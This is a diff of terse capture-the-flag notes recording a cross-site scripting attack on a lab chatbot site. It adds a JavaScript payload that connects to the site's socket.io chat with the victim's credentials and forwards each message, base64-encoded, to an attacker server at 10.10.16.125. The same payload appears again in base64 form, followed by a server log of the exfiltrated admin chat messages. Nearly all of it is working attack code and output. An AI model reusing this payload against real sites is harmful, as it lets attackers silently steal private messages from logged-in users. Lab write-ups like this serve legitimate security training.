@@ -89,7 +89,7 @@ trying script:
     script.addEventListener('load', function () {
         const res = axios.get(`/user/api/chat`);
         const socket = io('/', { withCredentials: true });
-        socket.on('message', (my_message)  {
+        socket.on('message', (my_message) =>{
             fetch("http://10.10.16.125:80/?d=" + btoa(my_message))
         });
         socket.emit('client_message', 'history');
@@ -98,6 +98,35 @@ trying script:
 tried to inject on chatbot
 
 nothing
+
+took the script to a cyberchef and encoded it to a base64
+
+Y29uc3Qgc2NyaXB0ID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgnc2NyaXB0Jyk7DQpzY3JpcHQuc3JjID0gJy9zb2NrZXQuaW8vc29ja2V0LmlvLmpzJzsNCmRvY3VtZW50LmhlYWQuYXBwZW5kQ2hpbGQoc2NyaXB0KTsNCnNjcmlwdC5hZGRFdmVudExpc3RlbmVyKCdsb2FkJywgZnVuY3Rpb24gKCkgew0KCWNvbnN0IHJlcyA9IGF4aW9zLmdldChgL3VzZXIvYXBpL2NoYXRgKTsNCgljb25zdCBzb2NrZXQgPSBpbygnLycsIHsgd2l0aENyZWRlbnRpYWxzOiB0cnVlIH0pOw0KCXNvY2tldC5vbignbWVzc2FnZScsIChteV9tZXNzYWdlKSA9PnsNCgkJZmV0Y2goImh0dHA6Ly8xMC4xMC4xNi4xMjU6ODAvP2Q9IiArIGJ0b2EobXlfbWVzc2FnZSkpDQogICAgICAgIH0pOw0KICAgICAgICBzb2NrZXQuZW1pdCgnY2xpZW50X21lc3NhZ2UnLCAnaGlzdG9yeScpOw0KICAgICAgICB9KTsNCg==
+
+turned on a python server
+
+send it to a contact us page and get the response:
+    10.10.11.6 - - [29/Mar/2024 17:30:16] code 501, message Unsupported method ('OPTIONS')
+10.10.11.6 - - [29/Mar/2024 17:30:16] "OPTIONS /?d=R3JlZXRpbmdzIS4gSG93IGNhbiBpIGhlbHAgeW91IHRvZGF5ID8uIFlvdSBjYW4gdHlwZSBoZWxwIHRvIHNlZSBzb21lIGJ1aWxkaW4gY29tbWFuZHM= HTTP/1.1" 501 -
+10.10.11.6 - - [29/Mar/2024 17:30:16] code 501, message Unsupported method ('OPTIONS')
+10.10.11.6 - - [29/Mar/2024 17:30:16] "OPTIONS /?d=V3JpdGUgYSBzY3JpcHQgZm9yICBkZXYtZ2l0LWF1dG8tdXBkYXRlLmNoYXRib3QuaHRiIHRvIHdvcmsgcHJvcGVybHk= HTTP/1.1" 501 -
+10.10.11.6 - - [29/Mar/2024 17:30:16] code 501, message Unsupported method ('OPTIONS')
+10.10.11.6 - - [29/Mar/2024 17:30:16] "OPTIONS /?d=SGVsbG8sIEkgYW0gQWRtaW4uVGVzdGluZyB0aGUgQ2hhdCBBcHBsaWNhdGlvbg== HTTP/1.1" 501 -
+10.10.11.6 - - [29/Mar/2024 17:30:16] code 501, message Unsupported method ('OPTIONS')
+10.10.11.6 - - [29/Mar/2024 17:30:16] "OPTIONS /?d=V3JpdGUgYSBzY3JpcHQgdG8gYXV0b21hdGUgdGhlIGF1dG8tdXBkYXRl HTTP/1.1" 501 -
+10.10.11.6 - - [29/Mar/2024 17:30:16] code 501, message Unsupported method ('OPTIONS')
+10.10.11.6 - - [29/Mar/2024 17:30:16] "OPTIONS /?d=TWVzc2FnZSBTZW50Ojxicj5oaXN0b3J5 HTTP/1.1" 501 -
+10.10.11.6 - - [29/Mar/2024 17:30:18] code 501, message Unsupported method ('OPTIONS')
+10.10.11.6 - - [29/Mar/2024 17:30:18] "OPTIONS /?d=R3JlZXRpbmdzIS4gSG93IGNhbiBpIGhlbHAgeW91IHRvZGF5ID8uIFlvdSBjYW4gdHlwZSBoZWxwIHRvIHNlZSBzb21lIGJ1aWxkaW4gY29tbWFuZHM= HTTP/1.1" 501 -
+10.10.11.6 - - [29/Mar/2024 17:30:18] code 501, message Unsupported method ('OPTIONS')
+10.10.11.6 - - [29/Mar/2024 17:30:18] "OPTIONS /?d=SGVsbG8sIEkgYW0gQWRtaW4uVGVzdGluZyB0aGUgQ2hhdCBBcHBsaWNhdGlvbg== HTTP/1.1" 501 -
+10.10.11.6 - - [29/Mar/2024 17:30:18] code 501, message Unsupported method ('OPTIONS')
+10.10.11.6 - - [29/Mar/2024 17:30:18] code 501, message Unsupported method ('OPTIONS')
+10.10.11.6 - - [29/Mar/2024 17:30:18] "OPTIONS /?d=V3JpdGUgYSBzY3JpcHQgZm9yICBkZXYtZ2l0LWF1dG8tdXBkYXRlLmNoYXRib3QuaHRiIHRvIHdvcmsgcHJvcGVybHk= HTTP/1.1" 501 -
+10.10.11.6 - - [29/Mar/2024 17:30:18] "OPTIONS /?d=V3JpdGUgYSBzY3JpcHQgdG8gYXV0b21hdGUgdGhlIGF1dG8tdXBkYXRl HTTP/1.1" 501 -
+10.10.11.6 - - [29/Mar/2024 17:30:18] code 501, message Unsupported method ('OPTIONS')
+10.10.11.6 - - [29/Mar/2024 17:30:18] "OPTIONS /?d=TWVzc2FnZSBTZW50Ojxicj5oaXN0b3J5 HTTP/1.1" 501 -
+
 
 
 
